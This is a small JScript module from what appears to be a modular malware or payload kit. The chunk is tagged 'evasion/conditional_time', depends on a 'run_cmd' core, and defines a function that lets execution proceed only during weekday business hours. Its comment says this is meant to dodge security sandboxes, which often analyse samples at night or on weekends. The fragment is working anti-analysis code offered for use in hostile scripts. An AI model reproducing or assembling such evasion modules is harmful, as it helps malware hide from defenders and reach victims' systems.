// chunk: evasion/conditional_time
// depends: core/run_cmd
// provides: check_time
// format: jscript
// note: Checks if current time is within business hours (8am-6pm weekdays).
//       Returns true if safe to proceed. Sandboxes often run analysis outside
//       business hours or on weekends.

function check_time() {
    var now = new Date();
    var day = now.getDay();
    var hour = now.getHours();
    /* 0 = Sunday, 6 = Saturday */
    if (day === 0 || day === 6) return false;
    if (hour < 8 || hour >= 18) return false;
    return true;
}
